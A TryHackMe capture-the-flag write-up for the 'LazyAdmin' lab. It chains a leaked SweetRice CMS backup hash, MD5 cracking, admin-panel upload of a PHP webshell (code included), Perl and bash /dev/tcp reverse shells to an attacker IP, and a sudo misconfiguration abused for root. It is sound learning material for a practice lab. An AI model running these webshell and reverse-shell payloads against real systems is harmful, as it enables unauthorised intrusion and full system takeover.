---
layout: writeup
name: "LazyAdmin"
platform: "TryHackMe"
category: "thm"
difficulty: "Easy"
permalink: /writeups/thm/lazyadmin/
os: "Try Hack Me"
date: 2025-11-12
pwned: true
---
# LazyAdmin — Writeup (inksec.io)
# 🧪 LazyAdmin — Writeup (inksec.io)

**Platform:** Try Hack Me  
**IP:** 10.201.72.17  
**Difficulty:** Easy  
**OS:** Linux  
**Status:** Completed  
**Writeup Path:** /CTF-Writeups/Other/THM/LazyAdmin/README.md  
**Proof Image :** https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/thm_lazyadmin.png

---

## Overview
SweetRice CMS was exposed under `/content/`. An **exposed DB/backup file** inside `/content/inc/` leaked a **manager** password hash. Cracking the MD5 gave `Password123`, which worked at `/content/as/` (admin panel). Using the upload feature, a PHP webshell granted a foothold as `www-data`. Privilege escalation came from a **sudo NOPASSWD** entry on a Perl script `/home/itguy/backup.pl` that executes `/etc/copy.sh`. Overwriting `copy.sh` with a reverse shell and running the allowed Perl script yielded **root**.

**TL;DR chain:** Backup disclosure → MD5 crack → SweetRice admin → File upload → sudo perl → copy.sh abuse → **root**

---

## Enumeration

### Nmap / Rustscan
```bash
export target=10.201.72.17
rustscan --ulimit 5000 -a $target -- -sC -sV -Pn -oN nmap_full
# Open ports
# 22/tcp OpenSSH 7.2p2 (Ubuntu 4ubuntu2.8)
# 80/tcp Apache httpd 2.4.18 (Ubuntu)
```

### Web discovery
```bash
# Top-level
gobuster dir -u http://$target -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 -o scans/gb_dirs.txt
# → /content (SweetRice default)

# Under /content
gobuster dir -u http://$target/content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -o scans/gb_dirs2.txt
# → /images /js /inc
```

Identified SweetRice; checked for common disclosures. `/content/inc/` contained a backup/serialized data exposing a manager hash:
```
"Description";s:5:"admin";s:7:"manager";s:6:"passwd";s:32:"42f749ade7f9e195bf475f37a44cafcb";s:5:"close"
```

Crack with John (raw MD5):
```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
# → Password123
```

Optional version hunting:
```bash
searchsploit sweetrice
# SweetRice 1.5.1 Arbitrary File Upload / Backup Disclosure etc.
```

---

## Exploitation

### CMS Admin → Webshell
Login at `/content/as/` with `manager:Password123`. Use the upload feature to place a PHP webshell.

Minimal POST-exec shell used:
```php
<?php
if (!empty($_POST['cmd'])) { $cmd = shell_exec($_POST['cmd']); }
?>
<!doctype html><title>Web Shell</title>
<form method=post>
  <input name=cmd autofocus>
  <button>Exec</button>
</form>
<?php if(isset($cmd)) echo "<pre>".htmlspecialchars($cmd)."</pre>"; ?>
```

Spawn a reverse shell (Perl one-liner):
```bash
perl -e 'use Socket;$i="10.9.0.125";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

Shell established:
```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Privilege Escalation

Enumerate sudo permissions:
```bash
sudo -l
# Matching Defaults entries for www-data on THM-Chal:
#   env_reset, mail_badpass,
#   secure_path=...
# User www-data may run the following commands on THM-Chal:
#   (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Inspect the scripts:
```bash
cat /home/itguy/backup.pl
#!/usr/bin/perl
system("sh", "/etc/copy.sh");

cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

Overwrite `copy.sh` with our reverse shell and trigger:
```bash
echo "bash -c 'bash -i >& /dev/tcp/10.9.0.125/80 0>&1'" | sudo tee /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
```

Listener output:
```bash
nc -lvnp 80
# connection received
whoami
# root
```

---

## Proofs
```text
user.txt: THM{63e5bce9...REDACTED}
root.txt: THM{6637f41d...REDACTED}
```

---

## Post-Exploitation & Cleanup
- Remove webshells from upload dirs.
- Restore `/etc/copy.sh` if appropriate for the lab or leave as-is if not required.
- Close listeners and disconnect VPN.

---

## Lessons Learned
- Check CMS backup or `inc` folders for credential leaks.
- Weak MD5 hashes are trivial with `rockyou` + John.
- Sudo-maintained scripts often call other files—**edit the downstream target** if writable.

---

## Command Log (raw)
```bash
export target=10.201.72.17
rustscan --ulimit 5000 -a $target -- -sC -sV -Pn -oN nmap_full

gobuster dir -u http://$target -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 -o scans/gb_dirs.txt
gobuster dir -u http://$target/content/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50 -o scans/gb_dirs2.txt

searchsploit sweetrice
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5

# PHP webshell upload via SweetRice admin
perl -e 'use Socket;$i="10.9.0.125";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'

sudo -l
echo "bash -c 'bash -i >& /dev/tcp/10.9.0.125/80 0>&1'" | sudo tee /etc/copy.sh
sudo /usr/bin/perl /home/itguy/backup.pl
nc -lvnp 80
```

---


